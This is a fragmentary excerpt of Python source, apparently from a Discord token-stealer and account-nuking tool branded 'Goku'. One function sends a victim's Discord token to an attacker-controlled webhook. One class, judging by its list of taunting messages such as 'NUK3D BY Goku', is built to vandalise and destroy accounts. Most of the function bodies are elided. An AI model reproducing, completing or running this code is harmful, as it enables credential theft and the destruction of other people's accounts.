...
def _infotoken(token, wbh):
    try:
        ...
        webhook = DiscordWebhook(url=wbh, username="Goku", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
...
class _byebyeaccount:
    ...
    def __init__(self,token,idk):
        ...
        self.messages = ["NUK3D BY Goku", "G3T FUCK3D", "Gokus OWN YOU", "PEW PEW", "RAWR", "IM G4Y"]
